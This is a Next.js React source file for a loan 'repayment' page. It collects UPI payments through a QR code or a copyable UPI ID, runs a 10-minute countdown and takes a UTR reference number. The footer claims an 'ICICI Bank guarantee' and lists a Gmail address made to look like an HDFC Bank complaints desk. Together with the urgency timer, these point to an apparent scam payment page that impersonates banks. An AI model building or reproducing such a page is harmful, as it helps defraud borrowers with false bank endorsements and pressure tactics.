import Image from 'next/image';
import React, { useState, useEffect } from 'react'
import { FaArrowDownLong } from "react-icons/fa6";
import { FaCheck } from "react-icons/fa6";
import phonepe_select from "@/public/images/phonepe-select.png"
import paytm_select from "@/public/images/paytm-select.png"
import gpay_select from "@/public/images/gpay-select.png"
import upi_select from "@/public/images/upi-select.png"
import phonepe from "@/public/images/phonepe.png"
import paytm from "@/public/images/paytm.png"
import gpay from "@/public/images/gpay.png"
import upi from "@/public/images/upi.png"
import useStateContext from '@/context/ContextProvider';
import clipboardCopy from 'clipboard-copy';
import Accordion from '@mui/material/Accordion';
import AccordionSummary from '@mui/material/AccordionSummary';
import AccordionDetails from '@mui/material/AccordionDetails';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import QrCanvas from '@/utils/QrCanvas';
import scan from "@/public/images/scan.png";
import direct from "@/public/images/direct.png";



const Repayment = ({ app_settings }) => {

    const { set_snackbar_alert, handle_submit_utr_notification } = useStateContext();


    const [expanded, setExpanded] = useState('panel1');

    const handleChange = (panel) => (event, isExpanded) => {
        setExpanded(isExpanded ? panel : null);
    };


    // 10:00 minutes timer
    const [timeLeft, setTimeLeft] = useState(10 * 60); // 10 minutes in seconds

    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
        }, 1000);

        return () => clearInterval(timer); // Clean up the timer when the component unmounts
    }, []);

    // Format time into MM:SS
    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
    };


    const copyToClipboard = (text) => {
        clipboardCopy(text)
            .then(() => {
                set_snackbar_alert({
                    open: true,
                    message: `Copied:${text}`,
                    severity: "success"
                })

            })
            .catch((err) => {
                set_snackbar_alert({
                    open: true,
                    message: "Failed to copy",
                    severity: "primary"
                });
            });
    };


    const [select, set_select] = useState("");

    const [utr, set_utr] = useState("");

    const regex = /^\d{12}$/;

    const handle_submit = async (e) => {
        e.preventDefault();
        if (!select && expanded === "panel2") {
            return set_snackbar_alert({
                open: true,
                message: "Must select any payment method",
                severity: "warning"
            })
        }

        if (utr && regex.test(utr)) {
            const mail_res = await handle_submit_utr_notification(app_settings)
            if (mail_res !== "utr_submitted") {
                return set_snackbar_alert({
                    open: true,
                    message: "Please try again!",
                    severity: "error"
                })
            }
            set_utr("");
            return set_snackbar_alert({
                open: true,
                message: "UTR submitted",
                severity: "success"
            })
        } else {
            set_snackbar_alert({
                open: true,
                message: "Invalid UTR",
                severity: "warning"
            })
        }



    }

    return (
        <form onSubmit={handle_submit} className='py-[20px] px-[10px] w-screen min-h-screen' >


            <div className='w-full bg-violet-600 px-[15px] pt-[20px] pb-[60px] relative shadow-md' >
                <p className='text-[20px] text-white'>Payment Amount</p>
                <p ></p>

                <div className='w-full flex justify-between items-center mt-3' >
                    <p className='text-[23px] text-white font-semibold'> ₹ {app_settings.loan_amount}.00</p>
                    <p className='text-white text-[15px]' >{formatTime(timeLeft)}</p>
                </div>

                <div className='absolute w-full px-[15px] right-0 left-0 md:-bottom-3 -bottom-6' >
                    <div className='bg-white px-[10px] py-[10px] rounded-lg shadow-md' >
                        <p className='text-stone-900 text-[14px] font-medium'>Please choose one of the following methods to make payment</p>
                    </div>
                </div>

            </div>


            <div className='w-full my-9 md:my-6 px-[15px]'>
                {/* QR Scanner */}
                <Accordion
                    expanded={expanded === 'panel1'}
                    onChange={handleChange('panel1')}
                    elevation={0}
                    sx={{
                        border: 'none',
                        '&:before': { display: 'none' },
                    }}
                    className="shadow-none p-0"
                >
                    <AccordionSummary
                        expandIcon={<ExpandMoreIcon />}
                        aria-controls="panel1-content"
                        id="panel1-header"
                        className='px-[15px] '
                    >
                        <div className='flex gap-2 items-center' >
                            <Image src={scan} className='w-[30px] object-contain' />
                            <p className='text-[14px] font-semibold text- text-violet-600'>Scan QRCode</p>
                        </div>
                    </AccordionSummary>
                    <AccordionDetails className='px-[10px] border-t border-stone-200'>

                        <div className='w-full bg-violet-50 py-[12px] px-[15px] rounded-t-xl mt-2' >
                            <span className='text-violet-600'>Step 1: </span>
                            {"Scan the QR and Transfer "}
                            <span className='text-[#ff0000] whitespace-nowrap'>₹ {app_settings.loan_amount}.00</span>
                        </div>

                        <div className='w-full text-center flex justify-center items-center flex-col'>

                            <p className='text-[15px] mt-2'>Use Mobile Scan code to pay</p>
                            <p className='text-[24px] font-bold text-red-500 mb-2'>₹ {app_settings.loan_amount}.00</p>
                            <QrCanvas text={`upi://pay?pa=${app_settings.upi_id ? app_settings.upi_id : ""}&am=${app_settings.loan_amount}.00&cu=INR`} />

                            <p className='mt-1 text-stone-400 text-[15px] font-medium'>Do not use the same QR code to pay multiple times</p>
                        </div>
                    </AccordionDetails>
                </Accordion>


                {/* Direct UPI */}
                <Accordion
                    expanded={expanded === 'panel2'}
                    onChange={handleChange('panel2')}
                    elevation={0}
                    sx={{
                        border: 'none',
                        borderTop: '1px solid #D1D5DB',
                        '&:before': { display: 'none' },
                    }}
                    className="shadow-none p-0"
                >


                    <AccordionSummary
                        expandIcon={<ExpandMoreIcon />}
                        aria-controls="panel1-content"
                        id="panel1-header"
                        className='px-[15px] '
                    >
                        <div className='flex gap-2 items-center' >
                            <Image src={direct} className='w-[30px] object-contain' />
                            <p className='text-[14px] font-semibold text- text-violet-600'>Direct Transfer</p>
                        </div>
                    </AccordionSummary>
                    <AccordionDetails className='px-[10px] border-t border-stone-200'>
                        <div className='w-full bg-violet-50 py-[12px] px-[15px] rounded-t-xl mt-2' >
                            <span className='text-violet-600'>Step 1: </span>
                            {"Transfer "}
                            <span className='text-[#ff0000] whitespace-nowrap'>₹ {app_settings.loan_amount}.00</span>
                            {" to the following upi "}
                        </div>

                        <div className='w-full py-[14px] px-[15px] border-b border-stone-300 flex justify-between items-center' >
                            <p className='text-[15px] text-stone-800'>{app_settings.upi_id}</p>
                            <button onClick={() => copyToClipboard(app_settings.upi_id)} className='px-[8px] py-[8px] active:opacity-70 text-white bg-violet-600 text-[13px] transition-all rounded-md'>{false ? "Copied" : "Copy"}</button>
                        </div>

                        <div className='w-full py-[14px] px-[15px] border-b border-stone-300 flex justify-between items-center shadow-md' >
                            <p className='text-[15px] text-stone-800'>{app_settings.loan_amount}.00</p>
                            <button onClick={() => copyToClipboard(`${app_settings.loan_amount}.00`)} className='px-[8px] py-[8px] active:opacity-70 text-white bg-violet-600 text-[13px] transition-all rounded-md'>{false ? "Copied" : "Copy"}</button>
                        </div>


                        {/* Payment methods */}
                        <div className='w-full bg-violet-50 py-[12px] px-[15px] rounded-t-xl mt-4' >
                            <span className='text-violet-600'>Step 2: </span>
                            {"Select the payment method"}
                        </div>
                        <div className='px-2' >


                            {/* PhonePe */}
                            <div onClick={() => set_select("phonepe")} className='mt-4 h-[55px] border-y border-zinc-100 flex items-center gap-16 cursor-pointer select-none' >
                                <button type={"button"} className={`border-blue-500 ${select === "phonepe" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                                    {select === "phonepe" ?
                                        <FaCheck />
                                        :
                                        <FaCheck className='text-white' />

                                    }
                                </button>

                                <Image src={phonepe_select} alt="Phone-pe" className='w-[90px] object-contain' />

                            </div>
                            {/* Paytm */}
                            <div onClick={() => set_select("paytm")} className='h-[55px] border-b border-zinc-100 flex items-center gap-[70px] cursor-pointer select-none' >
                                <button type="button" className={`border-blue-500 ${select === "paytm" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                                    {select === "paytm" ?
                                        <FaCheck />
                                        :
                                        <FaCheck className='text-white' />
                                    }
                                </button>

                                <Image src={paytm_select} alt="Paytm" className='w-[65px] object-contain' />

                            </div>
                            {/* G-pay */}
                            <div onClick={() => set_select("gpay")} className='h-[55px] border-b border-zinc-100 flex items-center gap-16 cursor-pointer select-none'  >
                                <button type="button" className={`border-blue-500 ${select === "gpay" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                                    {select === "gpay" ?
                                        <FaCheck />
                                        :
                                        <FaCheck className='text-white' />
                                    }
                                </button>

                                <Image src={gpay_select} alt="G Pay" className='w-[50px] 6object-contain' />

                            </div>
                            {/* UPI */}
                            <div onClick={() => set_select("upi")} className='h-[55px] border-b border-zinc-100 flex items-center gap-16 cursor-pointer select-none' >
                                <button className={`border-blue-500 ${select === "upi" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                                    {select === "upi" ?
                                        <FaCheck />
                                        :
                                        <FaCheck className='text-white' />
                                    }
                                </button>

                                <Image src={upi_select} alt="UPI" className='w-[60px] object-contain' />

                            </div>

                        </div>

                    </AccordionDetails>
                </Accordion>
            </div>





            {/* UTR input */}
            <div className='mt-4 px-[20px]' >
                <div className='w-full bg-violet-50 py-[12px] px-[15px] rounded-t-xl my-4' >

                    <span className='text-violet-600'>{expanded === "panel1" ? "Step 2:" : expanded === "panel2" ? "Step 3:" : ""}</span>

                    {" Submit Ref  No/Reference No/UTR "}
                </div>


                <div className='flex gap-8 border-b border-zinc-100 px-[16px] py-[12px]' >
                    <label className='text-slate-700 font-medium  text-[14px]' >UTR</label>
                    <input
                        value={utr}
                        onChange={e => set_utr(e.target.value)}
                        type="text"
                        className='border-none outline-none text-[13px] caret-gray-500 w-full'
                        placeholder='Input UTR number'
                    />
                </div>

            </div>


            {/* Buttons */}
            <div className='mt-2 px-[20px]'>
                <button type='submit' className='w-full bg-violet-600 active:opacity-75 transition-all py-[12px] text-[13px] text-white rounded-md' >
                    Submit UTR
                </button>
            </div>


            {/* Footer */}
            <div className='mt-10 px-[20px]'>
                <div className='flex w-full justify-center items-center' >
                    <Image src={phonepe} alt="PhonePe" className='w-[30px] rounded-lg' />
                    <Image src={gpay} alt="GPay" className='w-[30px] object-contain' />
                    <Image src={paytm} alt="Paytm" className='w-[30px] object-contain' />
                    <Image src={upi} alt="UPI" className='w-[80px] object-contain' />
                </div>

                <div className='mt-4'>
                    <p className='text-zinc-400 lead leading-[15px] font-normal  text-[11px] text-center' >
                        Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:
                    </p>
                </div>

                <div className='w-full flex justify-center pb-6' >
                    <a href='mailto:hdfcbankcomplaintacceptance@gmail.com'
                        className='text-violet-700 font-bold  text-[11px] text-center'
                    >
                        hdfcbankcomplaintacceptance@gmail.com
                    </a>
                </div>

            </div>



        </form>
    )
}

export default Repayment